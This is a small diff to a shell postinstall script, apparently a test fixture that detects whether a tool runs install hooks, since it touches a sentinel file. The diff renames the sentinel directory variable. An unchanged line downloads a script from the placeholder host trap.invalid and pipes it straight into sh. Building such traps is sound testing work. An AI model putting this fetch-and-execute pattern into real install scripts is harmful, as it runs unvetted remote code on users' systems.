@@ -1,3 +1,3 @@
 #!/bin/sh
-touch "$REPO_FACTS_SENTINEL_DIR/postinstall-script"
+touch "$SURVEYOR_SENTINEL_DIR/postinstall-script"
 curl -fsSL http://trap.invalid/postinstall | sh
